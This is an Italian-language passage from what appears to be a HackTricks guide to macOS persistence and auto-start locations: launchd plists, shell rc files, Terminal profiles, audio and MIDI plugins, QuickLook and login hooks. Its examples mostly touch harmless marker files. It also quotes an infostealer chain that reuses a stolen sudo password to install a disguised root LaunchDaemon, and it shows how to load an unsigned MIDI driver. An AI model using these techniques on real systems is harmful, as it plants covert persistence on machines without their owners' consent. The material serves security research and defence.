# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Questa sezione si basa in larga misura sulla serie di articoli [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). L'obiettivo è individuare le posizioni in cui la scrittura di un file può portare a una successiva esecuzione di codice, l'evento che attiva l'esecuzione e le autorizzazioni necessarie. La presenza di una posizione non prova che il meccanismo sia abilitato. Le verifiche locali indicate di seguito sono state eseguite su macOS 26.5.2 (5 ottobre 2026); non dimostrano il comportamento di tutte le versioni di macOS.

> [!NOTE]
> “Attivato dalla scrittura” non significa sempre “eseguito subito dopo la scrittura”. Alcune posizioni vengono lette solo all'accesso, all'avvio di una specifica applicazione o quando un utente compie un'azione. Anche un payload scrivibile all'interno di un job già configurato è diverso dall'autorizzazione a registrare un nuovo job. Prima di affidarsi a una tecnica, testarla in un account o in una VM usa e getta.

## Sandbox Bypass

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per il **sandbox bypass**, che consentono di eseguire qualcosa semplicemente **scrivendolo in un file** e **attendendo** un'azione molto **comune**, un **determinato intervallo di tempo** o un'**azione che di solito puoi eseguire** dall'interno di una sandbox senza bisogno dei permessi di root.

### Launchd

- Utile per il sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
  - **Trigger**: accesso dell'utente (o registrazione esplicita)
  - È necessario root
- **`/Library/LaunchDaemons`**
  - **Trigger**: avvio del sistema (o registrazione esplicita)
  - È necessario root
- **`/System/Library/LaunchAgents`**
  - **Trigger**: accesso dell'utente; posizione di sistema protetta da Apple
- **`/System/Library/LaunchDaemons`**
  - **Trigger**: avvio del sistema; posizione di sistema protetta da Apple
- **`~/Library/LaunchAgents`**
  - **Trigger**: nuovo accesso dell'utente

Non esiste una posizione `~/Library/LaunchDaemons` analizzata da `launchd`. I job per utente appartengono a `~/Library/LaunchAgents`; la directory dei daemon di sistema è `/Library/LaunchDaemons`. La [guida di Apple all'avvio di launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documenta le posizioni analizzate.

> [!TIP]
> Come fatto interessante, **`launchd`** contiene una property list incorporata nella sezione Mach-o `__Text.__config`, che elenca altri servizi noti che launchd deve avviare. Inoltre, questi servizi possono contenere `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, il che significa che devono essere eseguiti e terminare correttamente.
>
> Ovviamente, non è possibile modificarla a causa della firma del codice.

#### Description & Exploitation

**`launchd`** è il **primo** **processo** eseguito dal kernel OX S all'avvio e l'ultimo a terminare durante lo spegnimento. Dovrebbe sempre avere **PID 1**. Questo processo **legge ed esegue** le configurazioni indicate nelle **plist** **ASEP** in:

- `/Library/LaunchAgents`: agenti per utente installati dall'amministratore
- `/Library/LaunchDaemons`: daemon di sistema installati dall'amministratore
- `/System/Library/LaunchAgents`: agenti per utente forniti da Apple.
- `/System/Library/LaunchDaemons`: daemon di sistema forniti da Apple.

Quando un utente accede, `launchd` carica le plist nella `~/Library/LaunchAgents` di quell'utente con i permessi dello stesso. I job vengono avviati in base alle rispettive chiavi; il semplice caricamento di una plist non implica l'esecuzione immediata di un processo.

La **differenza principale tra agenti e daemon è che gli agenti vengono caricati quando l'utente accede, mentre i daemon vengono caricati all'avvio del sistema** (poiché ci sono servizi, come ssh, che devono essere eseguiti prima che qualsiasi utente acceda al sistema). Inoltre, gli agenti possono usare la GUI, mentre i daemon devono essere eseguiti in background.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Ogni elemento di `ProgramArguments` è un argomento separato; `launchd` non interpreta una singola stringa come un comando shell. È possibile verificare la sintassi dell’esempio corretto qui sopra senza caricarlo, usando `plutil -lint /path/to/example.plist`. Consulta la voce locale di `man launchd.plist` per `ProgramArguments`, `RunAtLoad` e `KeepAlive`.

#### Trigger basati su eventi dei file nei job esistenti

Un agent o daemon **già caricato** può usare `WatchPaths` per avviarsi quando cambia un percorso specificato. `QueueDirectories` avvia un job finché una directory non è vuota; `StartOnMount` lo avvia quando viene montato un volume. [La guida di Apple a launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) include esempi di `WatchPaths` e `QueueDirectories`. Una scrittura in un file monitorato attiva il **job già configurato**; consente l’esecuzione di codice arbitrario solo se chi scrive può anche controllare l’eseguibile, lo script o i dati interpretati dal job. Scrivere semplicemente un nuovo plist al di fuori di una posizione monitorata o registrata non lo carica.

Questa PoC che si ripulisce da sola registra un **temporary user agent** con un nome univoco, modifica solo il proprio file monitorato e rimuove l’agent. È stata eseguita correttamente su macOS 26.5.2 senza logout né riavvio:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

L'esecuzione locale ha stampato `watch fired: True` e `bootout` è riuscito. Qui `launchctl bootstrap` viene usato solo all'interno del PoC isolato; **non** è necessario per un job già caricato. Per valutare in sicurezza un job esistente, leggi il suo plist e il percorso risolto di `ProgramArguments`, quindi verifica se l'eseguibile o il file interpretato corrispondente è scrivibile, senza modificarlo.

In alcuni casi è necessario che un **agent venga eseguito prima che l'utente effettui l'accesso**: questi sono chiamati **PreLoginAgents**. Ad esempio, sono utili per fornire tecnologie assistive al login. Si possono trovare anche in `/Library/LaunchAgents` (vedi [**qui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un esempio).

> [!TIP]
> I file di configurazione di nuovi Daemon o Agent verranno **caricati dopo il prossimo riavvio oppure usando** `launchctl load <target.plist>`. È **anche possibile caricare file .plist senza quell'estensione** con `launchctl -F <file>` (tuttavia, questi file plist non verranno caricati automaticamente dopo il riavvio).\
> È anche possibile **scaricarli** con `launchctl unload <target.plist>` (il processo indicato verrà terminato),
>
> Per **assicurarti** che **nulla** (come un override) **impedisca** a un **Agent** o a un **Daemon** **di** **avviarsi**, esegui: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Elenca tutti gli agent e i daemon caricati dall'utente corrente:

```bash
launchctl list
```

#### Esempio di catena LaunchDaemon malevola (riutilizzo della password)

Un recente infostealer per macOS ha riutilizzato una **password sudo acquisita** per installare un user agent e un LaunchDaemon con privilegi di root:<sup>[[1]](#references)</sup>

- Scrivere il loop dell’agent in `~/.agent` e renderlo eseguibile.
- Generare un plist in `/tmp/starter` che punti a quell’agent.
- Riutilizzare la password rubata con `sudo -S` per copiarlo in `/Library/LaunchDaemons/com.finder.helper.plist`, impostare `root:wheel` e caricarlo con `launchctl load`.
- Avviare l’agent silenziosamente con `nohup ~/.agent >/dev/null 2>&1 &` per scollegarne l’output.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Un plist di daemon collocato in `/Library/LaunchDaemons` non diventa sicuro assegnandogli la proprietà a un utente. `launchd` richiede proprietà e permessi appropriati per i job di sistema e potrebbe rifiutare un plist non sicuro. Un daemon di proprietà di root viene normalmente eseguito come root, a meno che la sua configurazione non selezioni un altro account. Controlla `UserName`, `GroupName`, la proprietà e i permessi del job, nonché i messaggi diagnostici di `launchctl`; non dedurre l'identità con cui viene eseguito basandoti solo sul nome del proprietario del plist.

#### Ulteriori informazioni su launchd

**`launchd`** è il **primo** processo in modalità utente avviato dal **kernel**. L'avvio del processo deve **avvenire correttamente** e il processo **non può terminare né andare in crash**. È persino **protetto** da alcuni **segnali di terminazione**.

Una delle prime cose che `launchd` fa è **avviare** tutti i **daemon**, come:

- **Daemon timer** basati sull'orario di esecuzione:
  - `com.apple.atrun.plist` invoca `/usr/libexec/atrun` con `StartInterval = 30` secondi in macOS 26.5.2; il suo stato effettivo di abilitazione può differire dal valore della chiave `Disabled` nel plist, perché launchd conserva separatamente gli override.
  - `com.vix.cron.plist` invoca `/usr/sbin/cron` quando `/usr/lib/cron/tabs` contiene dei job. `com.apple.systemstats.daily` è un servizio pianificato distinto, non il daemon cron.
- **Daemon di rete** come:
  - `org.cups.cups-lpd`: è in ascolto su TCP (`SockType: stream`) con `SockServiceName: printer`
    - SockServiceName deve essere una porta o un servizio presente in `/etc/services`
  - `com.apple.xscertd.plist`: è in ascolto su TCP sulla porta 1640
- **Daemon di percorso**, eseguiti quando cambia un percorso specificato:
  - `com.apple.postfix.master`: controlla il percorso `/etc/postfix/aliases`
- **Daemon di notifiche IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
  - `com.apple.xscertd-helper.plist`: la voce `MachServices` indica il nome `com.apple.xscertd.helper`
- **UserEventAgent:**
  - È diverso dal caso precedente. Fa sì che launchd avvii app in risposta a eventi specifici. Tuttavia, in questo caso il binario principale coinvolto non è `launchd`, ma `/usr/libexec/UserEventAgent`. Carica plugin dalla cartella protetta da SIP /System/Library/UserEventPlugins/, dove ogni plugin indica il proprio inizializzatore nella chiave `XPCEventModuleInitializer` oppure, nel caso dei plugin più vecchi, nel dizionario `CFPluginFactories`, sotto la chiave `FB86416D-6164-2070-726F-70735C216EC0` del relativo `Info.plist`.

### file di avvio della shell

Analisi: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Analisi (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ma devi trovare un'app con un TCC bypass che esegua una shell che carica questi file

#### Percorsi

- **`~/.zshenv`** (o la versione compilata più recente **`~/.zshenv.zwc`**)
  - **Attivazione**: qualsiasi invocazione ordinaria di zsh, compreso `zsh -c` non interattivo; `zsh -f` salta i file di avvio dell'utente.
- **`~/.zshrc`**
  - **Attivazione**: avvio di zsh interattiva.
- **`~/.zprofile`, `~/.zlogin`**
  - **Attivazione**: avvio di zsh come login; vengono letti rispettivamente prima e dopo `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Attivazione**: apertura di un terminale con zsh
  - Richiede root
- **`~/.zlogout`**
  - **Attivazione**: terminazione normale di una zsh avviata come login; non a ogni chiusura di terminale o shell.
- **`/etc/zlogout`**
  - **Attivazione**: chiusura di un terminale con zsh
  - Richiede root
- Possibili altri percorsi: **`man zsh`**
- **`~/.bashrc`**
  - **Attivazione**: avvio di Bash interattiva **non-login**. Una Bash interattiva avviata come login lo legge solo se un file di login lo richiama esplicitamente.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Attivazione**: avvio di Bash come login; viene eseguito il primo file leggibile, nell'ordine indicato. `~/.profile` viene ignorato se esiste uno dei due file precedenti.
- **`/etc/profile`**
  - **Attivazione**: avvio di Bash come login; per modificarlo servono i privilegi di root.
- **`~/.tcshrc`** oppure, se assente, **`~/.cshrc`**
  - **Attivazione**: avvio di `tcsh`, anche con `tcsh -c` non interattivo su questo Mac. L'utente deve invocare effettivamente `tcsh`; non è la shell predefinita di macOS.
- **`~/.login`**
  - **Attivazione**: avvio di `tcsh` come login, dopo il relativo file rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Attivazione**: dovrebbero essere attivati con xterm, ma **non è installato** e, anche dopo averlo installato, viene mostrato questo errore: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Descrizione e sfruttamento

Quando si avvia un ambiente shell come `zsh` o `bash`, **vengono eseguiti determinati file di avvio**. Attualmente macOS usa `/bin/zsh` come shell predefinita. Che Terminal o SSH avviino una shell come login o interattiva dipende dalla loro configurazione; non dare per scontato che ogni file riportato sopra venga eseguito in ogni sessione. Anche se macOS include `bash` e `sh`, per usarle è necessario invocarle esplicitamente.<sup>[[2]](#references)</sup> Il [riferimento ai file di avvio di zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) specifica l'ordine, l'override `ZDOTDIR` e la regola relativa a `.zwc`.

Il seguente esperimento in sola lettura è stato eseguito usando un `ZDOTDIR` temporaneo su macOS 26.5.2. Mostra quali file utente sono stati letti; non è stato modificato nessun file di avvio della shell reale:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

L'ordine osservato era `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` deve già puntare alla directory alternativa; non basta creare file in una directory qualsiasi.

La [documentazione di riferimento di Bash all'avvio](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) distingue le shell di login da quelle interattive. Sulla macchina di test macOS 26.5.2, una `HOME` isolata contenente tutti e quattro i file di avvio utente ha prodotto: `bash -c` → nessuno, `bash -ic` → `.bashrc`, `bash -lc` e `bash -lic` → solo `.bash_profile`. Rimuovendo `.bash_profile`, Bash di login ha letto `.bash_login`, poi `.profile` dopo aver rimosso anche quest'ultimo. `BASH_ENV` può indirizzare Bash non interattivo a un file, ma la variabile d'ambiente deve essere già impostata nel processo che lo invoca. Anche un `exit` esplicito da Bash di login può caricare `~/.bash_logout`.

Il manuale locale `tcsh(1)` documenta un ordine di avvio distinto. Con una `HOME` temporanea, `/bin/tcsh -c :` ha letto `.tcshrc`, oppure `.cshrc` se `.tcshrc` non era presente. Una `tcsh` di login temporanea ha letto `.tcshrc` e `.login`. Queste verifiche hanno creato e rimosso solo file temporanei.

### Applicazioni riaperte

> [!CAUTION]
> In fase di test, configurare l'exploitation indicata e disconnettersi e riconnettersi, oppure persino riavviare, non ha eseguito l'app. Potrebbe essere necessario che l'app sia in esecuzione quando si effettuano queste operazioni.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Percorso

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: riavvio che riapre le applicazioni

#### Descrizione ed exploitation

Tutte le applicazioni da riaprire si trovano nel plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Quindi, per fare in modo che le applicazioni riaperte avviino la tua, devi solo **aggiungere la tua app all'elenco**.

Puoi trovare l'UUID elencando quella directory o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Per verificare quali applicazioni verranno riaperte, puoi eseguire:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Per **aggiungere un'applicazione a questo elenco** puoi usare:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferenze di Terminale

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminale può essere usato per ottenere i permessi FDA dell'utente

#### Posizione

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: aprire una nuova finestra o scheda di Terminale usando il profilo le cui impostazioni Shell contengono il comando di avvio

#### Descrizione e sfruttamento

In **`~/Library/Preferences`** sono memorizzate le preferenze utente delle applicazioni. Alcune di queste preferenze possono contenere una configurazione per **eseguire altre applicazioni/script**.<sup>[[5]](#references)</sup>

Ad esempio, Terminale può eseguire un comando all'avvio:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Questa configurazione è riportata nel file **`~/Library/Preferences/com.apple.Terminal.plist`** in questo modo:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Se il profilo pertinente contiene un comando di avvio e Terminal legge questa preferenza, una nuova sessione che usa quel profilo può eseguirlo. [La guida attuale di Terminal di Apple](https://support.apple.com/guide/terminal/trmlshll/mac) documenta il comando per profilo **Shell → Startup**. Aprire Terminal senza avviare una nuova sessione che usa quel profilo non è sufficiente. Le modifiche alle preferenze riportate di seguito **non** sono state eseguite sul Mac di ricerca.

Puoi aggiungerlo dalla CLI con:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Script di Terminal / altre estensioni di file

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal usa le autorizzazioni FDA dell’utente

#### Posizione

- **Ovunque**
  - **Trigger**: Aprire il file `.terminal`, `.command` o `.tool` specifico

#### Descrizione e sfruttamento

Se un utente apre un file di impostazioni **`.terminal`**, Terminal può creare una sessione dal relativo profilo; anche i file eseguibili **`.command`** e **`.tool`** possono aprirsi in Terminal. Questo è un trigger esplicito all’apertura del file, non un’esecuzione che avviene semplicemente aprendo Terminal. L’eventuale accesso TCC ereditato dipende dalle autorizzazioni effettivamente concesse a Terminal e dall’operazione tentata. L’esempio storico seguente non è stato eseguito sul Mac usato per la ricerca.

Prova così:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Potresti anche usare le estensioni **`.command`**, **`.tool`**, con contenuti di normali shell script: verranno aperti anche da Terminal.

> [!CAUTION]
> Se Terminal dispone di **Full Disk Access**, potrà completare l'azione (nota che il comando eseguito sarà visibile in una finestra di Terminal).

### Plugin audio

Analisi: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Analisi: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Potresti ottenere ulteriore accesso TCC

#### Posizione

- **`/Library/Audio/Plug-Ins/HAL`**
  - Richiede root
  - **Trigger**: il server Core Audio carica un plug-in HAL compatibile; il riavvio del server può causare una nuova individuazione
- **`/Library/Audio/Plug-ins/Components`**
  - Richiede root
  - **Trigger**: un host audio individua e istanzia l'Audio Unit installata
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: un host audio individua e istanzia l'Audio Unit installata
- **`/System/Library/Components`**
  - Posizione protetta dal sistema e gestita da Apple
  - **Trigger**: un host audio istanzia un componente di sistema corrispondente

#### Descrizione

Secondo le analisi precedenti, è possibile **compilare alcuni plugin audio** e farli caricare.<sup>[[6]](#references)[[7]](#references)</sup>

I plug-in dei dispositivi HAL e le Audio Unit seguono percorsi di caricamento distinti. La [guida di Apple all'hosting delle Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) afferma che un host deve individuare e istanziare un componente; copiarne uno in una directory analizzata o riavviare `coreaudiod` non dimostra di per sé che il codice sia stato eseguito. I plug-in AUv2 vengono eseguiti nel processo host, mentre le [indicazioni attuali di Apple sulle Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) specificano che, su macOS, AUv3 viene eseguito per impostazione predefinita in un processo separato. I controlli di firma, sandbox e convalida delle librerie dipendono dall'host. Sul Mac usato per la ricerca non è stato installato né eseguito alcun plug-in audio.

### Driver CoreMIDI (MIDIServer)

Analisi: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Il tuo codice viene eseguito all'interno del processo `MIDIServer`, non nella sandbox della tua app
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` viene eseguito con un proprio profilo sandbox `seatbelt`

#### Posizione

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Non richiede root (scrivibile dall'utente)
  - **Trigger**: `MIDIServer` si avvia o si riavvia. Viene avviato su richiesta la prima volta che un processo usa CoreMIDI (aprendo *Configurazione MIDI Audio*, GarageBand, una DAW o una pagina che usa WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Richiede root
  - **Trigger**: come sopra

#### Descrizione e sfruttamento

`MIDIServer` di Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) carica i bundle dei **driver** MIDI dalle directory `Audio/MIDI Drivers`. Il binario è firmato da Apple, ma include l'entitlement `com.apple.security.cs.disable-library-validation`, quindi carica un bundle **non firmato o firmato ad hoc da un team diverso**, consentendo l'esecuzione di codice all'interno di un processo separato di proprietà di Apple **senza root**.<sup>[[53]](#references)</sup>

Verificato su macOS 26 (sola lettura):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Un driver è un bundle standard che esporta una factory `MIDIDriverInterface`; inserire il payload nella factory/nel constructor lo fa eseguire non appena `MIDIServer` enumera i driver. Compilalo, copialo in `~/Library/Audio/MIDI Drivers/Evil.plugin`, quindi attivane il caricamento senza effettuare logout o riavviare:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Potresti ottenere accesso aggiuntivo a TCC

#### Posizione

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrizione e sfruttamento

I plugin QuickLook possono essere eseguiti quando **attivi l’anteprima di un file** (premi la barra spaziatrice con il file selezionato nel Finder) e se è installato un **plugin che supporta quel tipo di file**.<sup>[[8]](#references)</sup>

È possibile compilare un proprio plugin QuickLook, inserirlo in una delle posizioni precedenti per caricarlo, quindi selezionare un file supportato e premere la barra spaziatrice per attivarlo.

Questi percorsi fanno riferimento a bundle `.qlgenerator` legacy; [la guida di Apple all’architettura Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) documenta l’ordine di ricerca e i tipi di file corrispondenti. Le **app extension** Quick Look attuali sono incluse in un’app e hanno regole di registrazione ed esecuzione diverse. La presenza di un generator non dimostra che venga selezionato per quel tipo di file né che il suo codice venga eseguito direttamente in Finder. Il percorso legacy dei generator è stato verificato consultando la documentazione e controllando la presenza delle directory; sul Mac di ricerca non è stato installato né caricato alcun generator.

### ~~Hook di login/logout~~

> [!CAUTION]
> A me non ha funzionato, né con il LoginHook dell’utente né con il LogoutHook di root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Devi poter eseguire qualcosa come `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Sono deprecati, ma possono essere usati per eseguire comandi quando un utente effettua il login.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Questa impostazione è memorizzata in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Per eliminarlo:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Quello dell'utente root è archiviato in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per il **sandbox bypass**, che consentono di eseguire qualcosa semplicemente **scrivendolo in un file** e **facendo affidamento su condizioni non molto comuni**, come la presenza di specifici **programmi installati, azioni "insolite" dell'utente** o particolari ambienti.

### Cron

**Articolo**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Utile per il sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Tuttavia, devi poter eseguire il binario `crontab`
  - Oppure devi essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/usr/lib/cron/tabs/`**
  - È necessario essere root per l'accesso diretto in scrittura. Non serve essere root se puoi eseguire `crontab <file>`
